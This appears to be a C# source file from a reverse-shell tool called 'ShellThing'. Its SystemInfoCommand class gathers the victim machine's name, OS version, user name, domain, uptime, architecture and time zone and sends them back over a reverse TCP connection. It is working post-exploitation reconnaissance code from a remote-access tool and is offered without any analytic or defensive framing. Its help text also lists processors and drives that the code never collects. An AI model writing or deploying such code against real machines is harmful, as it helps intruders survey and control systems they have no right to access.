using System;
using System.Collections.Generic;
using System.Management;
using System.Linq;
using System.Text;

namespace ShellThing
{
    class SystemInfoCommand : ICommand
    {
        TcpReverseConnection connection;

        public void Execute(TcpReverseConnection connection, string[] commandArguments)
        {
            this.connection = connection;

            //This is what will return when the systeminfo command is run is this shell
            connection.SendData($"MachineName: {Environment.MachineName}\n");
            connection.SendData($"OSVersion: {Environment.OSVersion}\n");
            connection.SendData($"dotNETVersion: {Environment.Version}\n");
            //Hotfixes are the last thing to be added. 
            connection.SendData($"UserName: {Environment.UserName}\n");
            connection.SendData($"DomainName: {Environment.UserDomainName}\n");
            connection.SendData($"TimeSinceBoot: {TimeSpan.FromMilliseconds(Environment.TickCount)}\n");
            //The Is64BitOperatingSystem only returns true or false. 
            if (Environment.Is64BitOperatingSystem)
            {
                connection.SendData($"Architecture: x64\n");
            }
            else
            {
                connection.SendData($"Archtecture: x86\n");
            }
            connection.SendData($"Time zone: {(TimeZoneInfo.Local.IsDaylightSavingTime(DateTime.Now) ? TimeZoneInfo.Local.DaylightName : TimeZoneInfo.Local.StandardName)}\nCurrent Time: {DateTime.Now}\n");
        }

        public Dictionary<string, string> Help(bool includeSyntax)
        {
            Dictionary<string, string> helpText = new Dictionary<string, string>();

            helpText.Add("systeminfo", "Show system information (current user, os version, arch, processors, drives)");

            return helpText;
        }
    }
}
